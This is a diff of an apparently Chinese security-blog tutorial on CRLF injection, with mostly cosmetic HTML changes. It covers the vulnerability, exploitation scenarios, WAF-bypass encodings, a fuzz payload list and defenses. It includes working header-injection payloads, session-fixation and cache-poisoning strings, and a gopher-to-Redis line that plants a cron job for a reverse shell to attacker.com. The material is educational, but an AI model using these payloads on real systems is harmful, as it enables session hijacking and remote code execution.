@@ -156,10 +156,10 @@
 <p>说白了，浏览器和服务端就是靠 <code>\r\n</code> 来认「这个头到哪结束、Body 从哪开始」的。一旦用户输入能往响应头里塞 <code>\r\n</code>，整个响应结构就被接管了。</p>
 <hr>
 <h2 id="二、漏洞原理"><a href="#二、漏洞原理" class="headerlink" title="二、漏洞原理"></a>二、漏洞原理</h2><p>漏洞本质：<strong>Web 应用把用户输入写进 HTTP 响应头时，没有过滤 CRLF 字符。</strong></p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 典型的漏洞代码（Python Flask 示例）</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/redirect&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">redirect</span>():</span><br><span class="line">    url = request.args.get(<span class="string">&#x27;url&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> redirect(url)</span><br><span class="line">    <span class="comment"># 如果 url = &quot;http://normal.com%0d%0aSet-Cookie:evil=1&quot;</span></span><br><span class="line">    <span class="comment"># 响应变成：</span></span><br><span class="line">    <span class="comment"># Location: http://normal.com</span></span><br><span class="line">    <span class="comment"># Set-Cookie: evil=1       ← 攻击者注入的响应头</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><div class="table-scroll"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 典型的漏洞代码（Python Flask 示例）</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/redirect&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">redirect</span>():</span><br><span class="line">    url = request.args.get(<span class="string">&#x27;url&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> redirect(url)</span><br><span class="line">    <span class="comment"># 如果 url = &quot;http://normal.com%0d%0aSet-Cookie:evil=1&quot;</span></span><br><span class="line">    <span class="comment"># 响应变成：</span></span><br><span class="line">    <span class="comment"># Location: http://normal.com</span></span><br><span class="line">    <span class="comment"># Set-Cookie: evil=1       ← 攻击者注入的响应头</span></span><br></pre></td></tr></table></div></figure>
 
 <p>常见注入点：</p>
-<table>
+<div class="table-scroll"><table>
 <thead>
 <tr>
 <th>注入位置</th>
@@ -182,17 +182,17 @@
 <td>Referer &#x2F; User-Agent 回显</td>
 <td>页面把请求头原样输出到响应</td>
 </tr>
-</tbody></table>
+</tbody></table></div>
 <hr>
 <h2 id="三、利用场景"><a href="#三、利用场景" class="headerlink" title="三、利用场景"></a>三、利用场景</h2><h3 id="3-1-XSS-绕过-关闭浏览器-XSS-Filter"><a href="#3-1-XSS-绕过-关闭浏览器-XSS-Filter" class="headerlink" title="3.1 XSS 绕过 &#x2F; 关闭浏览器 XSS Filter"></a>3.1 XSS 绕过 &#x2F; 关闭浏览器 XSS Filter</h3><p>最经典的用法：先注入 <code>X-XSS-Protection: 0</code> 关掉浏览器防护，然后紧跟一个空行切开响应体，在 Body 里塞 script：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 假设目标参数：?redirect=xxx</span></span><br><span class="line">?redirect=%0d%0aX-XSS-Protection:0%0d%0a%0d%0a&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><div class="table-scroll"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 假设目标参数：?redirect=xxx</span></span><br><span class="line">?redirect=%0d%0aX-XSS-Protection:0%0d%0a%0d%0a&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></div></figure>
 
 <p>实际响应变成：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 302 Found</span><br><span class="line">Location: /home</span><br><span class="line">X-XSS-Protection: 0</span><br><span class="line"></span><br><span class="line">&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><div class="table-scroll"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 302 Found</span><br><span class="line">Location: /home</span><br><span class="line">X-XSS-Protection: 0</span><br><span class="line"></span><br><span class="line">&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></div></figure>
 
 <p>浏览器收到的最终响应里 Body 带 <code>&lt;script&gt;</code>，原始的跳转行为直接被废掉了。</p>
 <h3 id="3-2-会话固定（Set-Cookie-注入）"><a href="#3-2-会话固定（Set-Cookie-注入）" class="headerlink" title="3.2 会话固定（Set-Cookie 注入）"></a>3.2 会话固定（Set-Cookie 注入）</h3><p>控制响应头就能给用户强制种一个攻击者指定的 Cookie：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?redirect=/%0d%0aSet-Cookie:JSPSESSID=attacker123;%20Path=/</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><div class="table-scroll"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?redirect=/%0d%0aSet-Cookie:JSPSESSID=attacker123;%20Path=/</span><br></pre></td></tr></table></div></figure>
 
 <p><strong>攻击链条：</strong></p>
 <ol>
@@ -202,22 +202,22 @@
 <li>攻击者用同样的 Session ID → 直接进入已认证会话</li>
 </ol>
 <h3 id="3-3-日志伪造"><a href="#3-3-日志伪造" class="headerlink" title="3.3 日志伪造"></a>3.3 日志伪造</h3><p>如果应用把请求参数写进日志且没过滤换行符，攻击者可以插入伪造的日志条目：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">输入 username = normal_user%0d%0a[2026-06-28 10:00] CRITICAL: Server shutdown by admin</span><br><span class="line"></span><br><span class="line">日志文件变成：</span><br><span class="line">[2026-06-28 10:00] ERROR: Login failed for user: normal_user</span><br><span class="line">[2026-06-28 10:00] CRITICAL: Server shutdown by admin   ← 伪造的</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><div class="table-scroll"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">输入 username = normal_user%0d%0a[2026-06-28 10:00] CRITICAL: Server shutdown by admin</span><br><span class="line"></span><br><span class="line">日志文件变成：</span><br><span class="line">[2026-06-28 10:00] ERROR: Login failed for user: normal_user</span><br><span class="line">[2026-06-28 10:00] CRITICAL: Server shutdown by admin   ← 伪造的</span><br></pre></td></tr></table></div></figure>
 
 <p>不止误导运维——污染后的日志如果喂给 SIEM&#x2F;SOAR 或 AI 分析模型，可能触发自动化误操作。</p>
 <h3 id="3-4-缓存投毒"><a href="#3-4-缓存投毒" class="headerlink" title="3.4 缓存投毒"></a>3.4 缓存投毒</h3><p>如果响应经过 CDN 或反向代理缓存，注入的恶意响应头会被缓存下来，影响所有后续用户：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=/%0d%0aCache-Control:public,max-age=86400%0d%0a%0d%0a&lt;script&gt;...&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><div class="table-scroll"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=/%0d%0aCache-Control:public,max-age=86400%0d%0a%0d%0a&lt;script&gt;...&lt;/script&gt;</span><br></pre></td></tr></table></div></figure>
 
 <p>一次注入，全站用户中招——被污染的缓存页一直蹲在那，谁来谁倒霉。</p>
 <h3 id="3-5-SSRF-CRLF-打内网"><a href="#3-5-SSRF-CRLF-打内网" class="headerlink" title="3.5 SSRF + CRLF 打内网"></a>3.5 SSRF + CRLF 打内网</h3><p>这是 CRLF 危害最大的一种玩法。SSRF 给了内网可达性，CRLF 给了协议走私能力：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">攻击路径：</span><br><span class="line">[公网] → SSRF 漏洞 → 内网 Redis:6379 → CRLF 注入 RESP 命令 → RCE</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><div class="table-scroll"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">攻击路径：</span><br><span class="line">[公网] → SSRF 漏洞 → 内网 Redis:6379 → CRLF 注入 RESP 命令 → RCE</span><br></pre></td></tr></table></div></figure>
 
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># gopher 协议打 Redis（利用 CRLF 构造 RESP 协议命令）</span></span><br><span class="line">gopher://127.0.0.1:6379/_*1%0d%0a<span class="variable">$8</span>%0d%0aflushall%0d%0a</span><br><span class="line">  *3%0d%0a<span class="variable">$3</span>%0d%0aset%0d%0a<span class="variable">$1</span>%0d%0a1%0d%0a<span class="variable">$64</span>%0d%0a</span><br><span class="line">  */1 * * * * bash -i &gt;&amp; /dev/tcp/attacker.com/4444 0&gt;&amp;1%0d%0a</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><div class="table-scroll"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># gopher 协议打 Redis（利用 CRLF 构造 RESP 协议命令）</span></span><br><span class="line">gopher://127.0.0.1:6379/_*1%0d%0a<span class="variable">$8</span>%0d%0aflushall%0d%0a</span><br><span class="line">  *3%0d%0a<span class="variable">$3</span>%0d%0aset%0d%0a<span class="variable">$1</span>%0d%0a1%0d%0a<span class="variable">$64</span>%0d%0a</span><br><span class="line">  */1 * * * * bash -i &gt;&amp; /dev/tcp/attacker.com/4444 0&gt;&amp;1%0d%0a</span><br></pre></td></tr></table></div></figure>
 
 <p>Redis RESP 协议本身就是用 CRLF 分隔命令的，SSRF + CRLF 就是塞 Redis 命令的钥匙。</p>
 <hr>
 <h2 id="四、绕过手法"><a href="#四、绕过手法" class="headerlink" title="四、绕过手法"></a>四、绕过手法</h2><p>WAF 和过滤规则日常盯的是 <code>%0d%0a</code> 和 <code>\r\n</code> 这些直白写法：</p>
-<table>
+<div class="table-scroll"><table>
 <thead>
 <tr>
 <th>绕过方式</th>
@@ -260,19 +260,19 @@
 <td><code>%2525250d%2525250a</code></td>
 <td>多层递归解码埋过 WAF 的检测深度</td>
 </tr>
-</tbody></table>
+</tbody></table></div>
 <hr>
-<h2 id="五、检测与-Fuzz"><a href="#五、检测与-Fuzz" class="headerlink" title="五、检测与 Fuzz"></a>五、检测与 Fuzz</h2><h3 id="5-1-Payload-字典"><a href="#5-1-Payload-字典" class="headerlink" title="5.1 Payload 字典"></a>5.1 Payload 字典</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"># 基础探测</span><br><span class="line">%0d%0aInjected-Header:test</span><br><span class="line">%0aInjected-Header:test</span><br><span class="line">%0dInjected-Header:test</span><br><span class="line"></span><br><span class="line"># 编码绕过</span><br><span class="line">/%250aHeader:test</span><br><span class="line">/%u000aHeader:test</span><br><span class="line"></span><br><span class="line"># 关 XSS Filter + 写 Body</span><br><span class="line">%0d%0aX-XSS-Protection:0%0d%0a%0d%0a&lt;script&gt;alert(1)&lt;/script&gt;</span><br><span class="line"></span><br><span class="line"># Set-Cookie</span><br><span class="line">%0d%0aSet-Cookie:crlftest=1</span><br><span class="line"></span><br><span class="line"># Location 覆盖</span><br><span class="line">%0d%0aLocation:http://evil.com</span><br></pre></td></tr></table></figure>
+<h2 id="五、检测与-Fuzz"><a href="#五、检测与-Fuzz" class="headerlink" title="五、检测与 Fuzz"></a>五、检测与 Fuzz</h2><h3 id="5-1-Payload-字典"><a href="#5-1-Payload-字典" class="headerlink" title="5.1 Payload 字典"></a>5.1 Payload 字典</h3><figure class="highlight plaintext"><div class="table-scroll"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"># 基础探测</span><br><span class="line">%0d%0aInjected-Header:test</span><br><span class="line">%0aInjected-Header:test</span><br><span class="line">%0dInjected-Header:test</span><br><span class="line"></span><br><span class="line"># 编码绕过</span><br><span class="line">/%250aHeader:test</span><br><span class="line">/%u000aHeader:test</span><br><span class="line"></span><br><span class="line"># 关 XSS Filter + 写 Body</span><br><span class="line">%0d%0aX-XSS-Protection:0%0d%0a%0d%0a&lt;script&gt;alert(1)&lt;/script&gt;</span><br><span class="line"></span><br><span class="line"># Set-Cookie</span><br><span class="line">%0d%0aSet-Cookie:crlftest=1</span><br><span class="line"></span><br><span class="line"># Location 覆盖</span><br><span class="line">%0d%0aLocation:http://evil.com</span><br></pre></td></tr></table></div></figure>
 
 <h3 id="5-2-工具"><a href="#5-2-工具" class="headerlink" title="5.2 工具"></a>5.2 工具</h3><ul>
 <li><strong><a target="_blank" rel="noopener" href="https://github.com/dwisiswant0/crlfuzz">crlfuzz</a></strong> — Go 写的专业 CRLF 扫描器，速度快，支持自定义 Payload 列表</li>
 <li><strong>Burp Intruder</strong> — 把上面的 Payload 字典灌进去逐条跑</li>
 <li><strong>手动 curl</strong>：</li>
 </ul>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -v <span class="string">&quot;https://target.com/path?param=test%0d%0aInjected:1&quot;</span></span><br><span class="line"><span class="comment"># 看响应头里有没有 &quot;Injected:1&quot;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><div class="table-scroll"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -v <span class="string">&quot;https://target.com/path?param=test%0d%0aInjected:1&quot;</span></span><br><span class="line"><span class="comment"># 看响应头里有没有 &quot;Injected:1&quot;</span></span><br></pre></td></tr></table></div></figure>
 
 <hr>
-<h2 id="六、防御"><a href="#六、防御" class="headerlink" title="六、防御"></a>六、防御</h2><table>
+<h2 id="六、防御"><a href="#六、防御" class="headerlink" title="六、防御"></a>六、防御</h2><div class="table-scroll"><table>
 <thead>
 <tr>
 <th>层级</th>
@@ -295,7 +295,7 @@
 <td>架构</td>
 <td>CDN &#x2F; 反向代理层加 CRLF 过滤；对敏感响应禁用缓存或加 <code>Vary</code> 头</td>
 </tr>
-</tbody></table>
+</tbody></table></div>
 <hr>
 <h2 id="七、案例参考"><a href="#七、案例参考" class="headerlink" title="七、案例参考"></a>七、案例参考</h2><ul>
 <li><a href="../../../03-%E5%AE%89%E5%85%A8%E8%B5%84%E6%BA%90/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Nginx/Nginx%E9%85%8D%E7%BD%AE%E9%94%99%E8%AF%AF%E5%AF%BC%E8%87%B4%E6%BC%8F%E6%B4%9E.md">Nginx 配置错误导致漏洞</a></li>
@@ -320,10 +320,10 @@
 
     
       <div class="next-post">
-        <a class="purple-link" href="/2026/06/28/file-inclusion/">
+        <a class="purple-link" href="/2026/06/28/csrf/">
           <h3 class="post-title">
             
-            下一篇：任意文件包含（LFI / RFI）
+            下一篇：CSRF 跨站请求伪造
           </h3>
         </a>
       </div>
